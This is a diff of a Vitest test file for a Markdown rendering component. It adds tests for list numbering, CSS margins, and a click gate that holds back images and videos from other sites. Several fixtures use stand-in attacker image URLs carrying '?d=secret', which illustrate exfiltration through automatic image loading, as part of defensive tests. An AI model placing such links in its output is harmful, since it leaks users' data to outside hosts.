@@ -1,6 +1,3 @@
-import { readFileSync } from "node:fs";
-import { dirname, join } from "node:path";
-import { fileURLToPath } from "node:url";
 import {
   act,
   cleanup,
@@ -12,13 +9,7 @@ import {
 import { afterEach, expect, test, vi } from "vitest";
 import { pageWithoutClipboardApi, selectedOnce } from "../clipboardTestKit";
 import { Markdown } from "./Markdown";
-
-const stylesPath = join(
-  dirname(fileURLToPath(import.meta.url)),
-  "..",
-  "..",
-  "styles.css",
-);
+import { stylesSource } from "../../stylesSource";
 
 afterEach(() => cleanup());
 
@@ -130,7 +121,7 @@ test("coddy-skill links render as chip spans", () => {
 });
 
 test("fenced code block wrapper keeps symmetric vertical margin in styles", () => {
-  const css = readFileSync(stylesPath, "utf8");
+  const css = stylesSource();
   const m = /\.md-code\s*\{[^}]*\}/.exec(css);
   expect(m).not.toBeNull();
   expect(m![0]).toMatch(/margin:\s*12px\s+0/);
@@ -213,7 +204,7 @@ test("inline code uses native title tooltip for Copy", () => {
 });
 
 test("inline code styles use grey fill without border in css", () => {
-  const css = readFileSync(stylesPath, "utf8");
+  const css = stylesSource();
   expect(css).toMatch(/--coddy-md-inline-code-fg:/);
   expect(css).toMatch(/--coddy-md-inline-code-bg:/);
   expect(css).not.toMatch(/--coddy-md-inline-code-bd:/);
@@ -259,10 +250,13 @@ test("an image or a link cannot carry a script", () => {
 
 test("images are loaded lazily and fit the column", () => {
   const { container } = render(
-    <Markdown text="![shot](https://raw.githubusercontent.com/x/y/main/a.png)" />,
+    <Markdown
+      text="![shot](https://raw.githubusercontent.com/x/y/main/a.png)"
+      remoteMedia="load"
+    />,
   );
   expect(container.querySelector("img")?.getAttribute("loading")).toBe("lazy");
-  const css = readFileSync(stylesPath, "utf8");
+  const css = stylesSource();
   expect(css).toMatch(/\.md img\s*\{[^}]*max-width:\s*100%/);
 });
 
@@ -288,7 +282,10 @@ test("an @coddy: reference in an answer opens the documentation reader", () => {
 // binary carries none.
 test("a video file in an image slot plays in a video element", () => {
   const { container } = render(
-    <Markdown text="![Video: swarm.mp4](https://raw.githubusercontent.com/x/y/1.1.55/docs/assets/video/swarm.mp4)" />,
+    <Markdown
+      text="![Video: swarm.mp4](https://raw.githubusercontent.com/x/y/1.1.55/docs/assets/video/swarm.mp4)"
+      remoteMedia="load"
+    />,
   );
   const video = container.querySelector("video");
   expect(video?.getAttribute("src")).toBe(
@@ -340,4 +337,97 @@ test("with breaks code keeps its newlines", () => {
   expect(inline?.querySelector("br")).toBeNull();
   // The paragraph's only newline is inside the code span.
   expect(container.querySelectorAll("p br")).toHaveLength(0);
+});
+
+test("a numbered list makes room for its longest number", () => {
+  const digitsOf = (text: string) => {
+    const { container, unmount } = render(<Markdown text={text} />);
+    const value = container
+      .querySelector("ol")
+      ?.style.getPropertyValue("--md-ol-digits");
+    unmount();
+    return value;
+  };
+  // One digit fits the list's margin as it is.
+  expect(digitsOf("1. one\n2. two")).toBe("");
+  // The last number decides, wherever the list starts.
+  expect(digitsOf("9. nine\n10. ten")).toBe("2");
+  expect(digitsOf("220. first\n221. second")).toBe("3");
+});
+
+test("list markers stay inside the text column, however long the number", () => {
+  const css = stylesSource().replace(/\s+/g, " ");
+  expect(css).toContain(
+    ".md :where(ol) { margin-left: calc(18px + (var(--md-ol-digits, 1) - 1) * 1ch); }",
+  );
+});
+
+test("a message ending in a list ends as one ending in a paragraph", () => {
+  const css = stylesSource().replace(/\s+/g, " ");
+  // The last item's own margin would come through the list's.
+  expect(css).toContain(
+    ".md > :where(ul, ol):last-child, .md > :where(ul, ol):last-child > :where(li:last-child) { margin-bottom: 0; }",
+  );
+});
+
+// An answer's picture from another site waits for a click: rendering it
+// would make the browser fetch the address, and whatever it carries, at once.
+test("a picture from another site waits for a click", () => {
+  const { container } = render(
+    <Markdown text="![diagram](https://attacker.example/x.png?d=secret)" />,
+  );
+  expect(container.querySelector("img")).toBeNull();
+  const gate = screen.getByTestId("md-remote-media");
+  expect(gate.textContent).toContain("diagram");
+  expect(gate.textContent).toContain("attacker.example");
+  fireEvent.click(gate);
+  expect(container.querySelector("img")?.getAttribute("src")).toBe(
+    "https://attacker.example/x.png?d=secret",
+  );
+});
+
+// A badge is a picture inside a link: the click on the gate loads the picture
+// and leaves the link alone.
+test("a picture from another site inside a link loads without following it", () => {
+  const { container } = render(
+    <Markdown text="[![badge](https://attacker.example/b.png)](https://example.com/)" />,
+  );
+  const gate = screen.getByTestId("md-remote-media");
+  // fireEvent returns false when a listener called preventDefault.
+  expect(fireEvent.click(gate)).toBe(false);
+  expect(container.querySelector("img")?.getAttribute("src")).toBe(
+    "https://attacker.example/b.png",
+  );
+});
+
+// A click agrees to one address, not to whatever comes to stand in its place:
+// a plan card or a live file preview changes under the reader.
+test("a picture that changes its address waits for a click again", () => {
+  const { container, rerender } = render(
+    <Markdown text="![a](https://attacker.example/a.png)" />,
+  );
+  fireEvent.click(screen.getByTestId("md-remote-media"));
+  expect(container.querySelector("img")).not.toBeNull();
+  rerender(<Markdown text="![a](https://attacker.example/b.png?d=secret)" />);
+  expect(container.querySelector("img")).toBeNull();
+  expect(screen.getByTestId("md-remote-media")).toBeTruthy();
+});
+
+test("a video from another site waits for a click", () => {
+  const { container } = render(
+    <Markdown text="![clip](https://attacker.example/clip.mp4)" />,
+  );
+  expect(container.querySelector("video")).toBeNull();
+  expect(screen.getByTestId("md-remote-media").textContent).toContain("video");
+});
+
+test("a picture of this server, a relative one and a data picture load at once", () => {
+  const own = `${window.location.origin}/coddy/sessions/s/assets/a.png`;
+  const { container } = render(
+    <Markdown
+      text={`![own](${own}) ![rel](assets/b.png) ![data](data:image/png;base64,iVBORw0KGgo=)`}
+    />,
+  );
+  expect(screen.queryByTestId("md-remote-media")).toBeNull();
+  expect(container.querySelectorAll("img")).toHaveLength(3);
 });
